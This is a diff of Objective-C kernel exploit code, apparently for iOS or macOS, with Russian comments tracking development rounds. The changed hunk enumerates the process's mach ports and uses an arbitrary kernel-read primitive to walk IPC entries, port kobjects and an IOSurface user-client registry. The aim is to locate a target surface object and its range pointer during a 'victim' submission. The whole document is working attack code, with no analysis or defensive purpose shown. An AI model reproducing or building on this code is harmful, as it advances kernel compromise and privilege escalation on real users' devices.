@@ -5817,40 +5817,72 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint64_t *)(tsdV + 8) = 1;   // async
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=400): kr=0x%x", avkr]);
-    // 3. Резолв surfVA через USERSPACE IOSurface-структуру (1.9.132): она в
-    //    нашей памяти — читаем напрямую, находим mach-порт и резолвим его
-    //    kobject через ДОВЕРЕННУЮ ipc-цепочку (port → ip_kobject = IOSurface
-    //    kernel object). Никаких UC-таблиц/op-записей/роминга по scheduler'у.
+    // 3. Резолв surfVA через реестр фреймворковского UC (раунд 21):
+    //    [ucVA+0xe8] = collection → +0xd0 array (индекс=surfaceID) → surfVA,
+    //    верификация [surfVA+0x10]==dstID. UC находим перебором наших портов —
+    //    читаем kreadbuf'ом (1.9.120 промах: kpRead не транслирует zone map,
+    //    где UC и живёт — фреймворковский UC отбрасывался молча).
     uint64_t surfVA = 0, rangesVA = 0;
     {
-        uint8_t *usp = (uint8_t *)dstS;   // userspace __IOSurface struct
-        for (uint32_t oo = 0; oo < 0x40; oo += 8) {
-            uint64_t q = *(volatile uint64_t *)(usp + oo);
-            kpNote(r, [NSString stringWithFormat:@"    usp+%#02x = %#018llx", oo, (unsigned long long)q]);
+        mach_port_name_array_t names = NULL;
+        mach_msg_type_number_t namesCnt = 0;
+        mach_port_type_array_t types = NULL;
+        mach_msg_type_number_t typesCnt = 0;
+        int nKobj = 0, nColl = 0, nLogged = 0;
+        kern_return_t mkr = mach_port_names(mach_task_self(), &names, &namesCnt, &types, &typesCnt);
+        kpNote(r, [NSString stringWithFormat:@"  mach_port_names: kr=0x%x, портов=%u", mkr, namesCnt]);
+        if (mkr == KERN_SUCCESS) {
+            for (uint32_t i = 0; i < namesCnt && !rangesVA; i++) {
+                uint32_t idx = names[i] >> 8;
+                uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * idx;
+                uint64_t oRaw = 0, kRaw = 0;
+                if (!kreadbuf(eVA + off_ipc_entry_ie_object, &oRaw, 8) || !oRaw) continue;
+                uint64_t portVA = kp_untag_ptr(oRaw);
+                if (!kpLooksLikeKernelPointer(portVA)) continue;
+                if (!kreadbuf(portVA + off_ipc_port_ip_kobject, &kRaw, 8) || !kRaw) continue;
+                uint64_t ucVA = kp_untag_ptr(kRaw);
+                if (!kpLooksLikeKernelPointer(ucVA)) continue;
+                nKobj++;
+                uint64_t coll = 0;
+                if (!kreadbuf(ucVA + 0xe8, &coll, 8) || !coll) continue;
+                coll = kp_untag_ptr(coll);
+                if (!kpLooksLikeKernelPointer(coll)) continue;
+                uint32_t cnt = 0;
+                if (!kreadbuf(coll + 0xd8, &cnt, 4)) continue;
+                if (cnt <= dstID || cnt > 0x200000) continue;
+                nColl++;
+                uint64_t arr = 0;
+                if (!kreadbuf(coll + 0xd0, &arr, 8)) continue;
+                arr = kp_untag_ptr(arr);
+                if (!kpLooksLikeKernelPointer(arr)) continue;
+                uint64_t cand = 0;
+                if (!kreadbuf(arr + (uint64_t)dstID * 8, &cand, 8) || !cand) continue;
+                cand = kp_untag_ptr(cand);
+                if (!kpLooksLikeKernelPointer(cand)) continue;
+                uint32_t cid = 0;
+                kreadbuf(cand + 0x10, &cid, 4);
+                if (nLogged < 6) {
+                    kpNote(r, [NSString stringWithFormat:@"    UC idx=%#x: cnt=%u cand=%#llx [cand+0x10]=%u", idx, cnt,
+                              (unsigned long long)cand, cid]);
+                    nLogged++;
+                }
+                if (cid != dstID) continue;   // раунд 21: surfaceID-поле
+                uint64_t ro = 0, rq = 0;
+                if (!kreadbuf(cand + 0x178, &ro, 8)) continue;
+                ro = kp_untag_ptr(ro);
+                if (!kpLooksLikeKernelPointer(ro)) continue;
+                if (!kreadbuf(ro + 0x18, &rq, 8)) continue;
+                if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
+                surfVA = cand;
+                rangesVA = ro + 0x18;
+                kpNote(r, [NSString stringWithFormat:@"  ★ UC idx=%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                          idx, (unsigned long long)surfVA, (unsigned long long)ro,
+                          (unsigned long long)rangesVA, (unsigned long long)rq]);
+            }
+            vm_deallocate(mach_task_self(), (vm_address_t)names, namesCnt * sizeof(mach_port_name_t));
+            vm_deallocate(mach_task_self(), (vm_address_t)types, typesCnt * sizeof(mach_port_type_t));
         }
-        for (uint32_t oo = 0; oo < 0x100 && !rangesVA; oo += 4) {
-            uint32_t name = *(volatile uint32_t *)(usp + oo);
-            if (!name || name > 0xFFFFFF) continue;   // правдоподобное имя порта
-            uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (name >> 8);
-            uint64_t oRaw = 0, kRaw = 0;
-            if (!kreadbuf(eVA + off_ipc_entry_ie_object, &oRaw, 8) || !oRaw) continue;
-            uint64_t portVA = kp_untag_ptr(oRaw);
-            if (!kpLooksLikeKernelPointer(portVA)) continue;
-            if (!kreadbuf(portVA + off_ipc_port_ip_kobject, &kRaw, 8) || !kRaw) continue;
-            uint64_t kobj = kp_untag_ptr(kRaw);
-            if (!kpLooksLikeKernelPointer(kobj)) continue;
-            uint64_t ro = 0, rq = 0;
-            if (!kreadbuf(kobj + 0x178, &ro, 8)) continue;
-            ro = kp_untag_ptr(ro);
-            if (!kpLooksLikeKernelPointer(ro)) continue;
-            if (!kreadbuf(ro + 0x18, &rq, 8)) continue;
-            if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
-            surfVA = kobj;
-            rangesVA = ro + 0x18;
-            kpNote(r, [NSString stringWithFormat:@"  ★ usp+%#x port=%#x: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
-                      oo, name, (unsigned long long)surfVA, (unsigned long long)ro,
-                      (unsigned long long)rangesVA, (unsigned long long)rq]);
-        }
+        kpNote(r, [NSString stringWithFormat:@"  walk-счётчики: kobj=%d coll(cnt ok)=%d", nKobj, nColl]);
     }
     kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
               (unsigned long long)surfVA, (unsigned long long)rangesVA]);
